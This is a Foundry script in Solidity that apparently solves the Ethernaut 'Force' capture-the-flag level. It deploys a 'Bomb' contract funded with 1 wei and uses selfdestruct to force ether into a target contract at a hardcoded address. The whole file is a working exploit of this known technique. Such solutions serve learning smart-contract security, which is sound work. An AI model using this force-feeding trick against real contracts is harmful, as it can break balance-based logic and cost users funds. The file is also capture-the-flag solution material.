// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Force.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Bomb {

    constructor () payable {}

    function forceSend(address target) public {
        selfdestruct(payable(target));
    }

}

contract ForceSolution is Script {

    Force public forceInstance = Force(0x229e2F7b9683AF1771c417b0c475d59CC69F4D69);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        Bomb bomb = new Bomb{value: 1 wei}();


        bomb.forceSend(address(forceInstance));

        vm.stopBroadcast();
    }
}